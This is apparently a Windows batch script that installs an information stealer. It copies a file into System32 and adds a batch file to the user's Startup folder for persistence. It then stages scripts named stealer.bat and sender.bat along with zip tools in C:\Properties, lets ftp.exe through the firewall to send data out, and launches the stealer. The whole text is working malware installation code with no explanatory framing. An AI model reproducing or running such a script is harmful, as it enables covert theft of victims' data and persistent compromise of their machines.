copy /y upload.txt C:\Windows\System32\
copy /y "update.bat" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp" >nul
md C:\Properties
copy /y stealer.bat C:\properties
copy /y sender.bat C:\properties
copy /y zip.exe C:\properties
copy /y unzip.exe C:\properties
netsh firewall add allowedprogram "%windir%\system32\ftp.exe" ENABLE
C:\properties\stealer.bat
